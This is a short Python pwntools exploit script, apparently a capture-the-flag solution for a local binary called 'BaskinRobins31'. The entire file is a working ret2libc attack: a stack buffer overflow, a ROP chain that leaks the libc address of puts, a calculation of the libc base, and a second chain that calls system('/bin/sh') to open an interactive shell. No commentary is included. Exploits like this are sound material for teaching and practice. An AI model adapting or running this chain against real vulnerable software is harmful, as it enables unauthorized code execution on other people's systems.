from pwn import *

#context.log_level = 'debug'

p = process('./BaskinRobins31')
e = ELF('./BaskinRobins31')
l = e.libc

prdi = 0x0000000000400bc3
prdx = 0x000000000040087c

payload = 'A'*(0xB0-4)
payload += p32(1)
payload += 'A'*8
payload += p64(prdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.symbols['main'])

p.sendafter('(1-3)', payload)


base = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')
base = base - l.symbols['puts']
binsh = base + l.search('/bin/sh').next()
print hex(base)

payload = 'A'*(0xB0-4)
payload += p32(1)
payload += 'A'*8
payload += p64(prdi)
payload += p64(binsh)
payload += p64(base + l.symbols['system'])

p.sendafter('(1-3)', payload)

p.interactive()
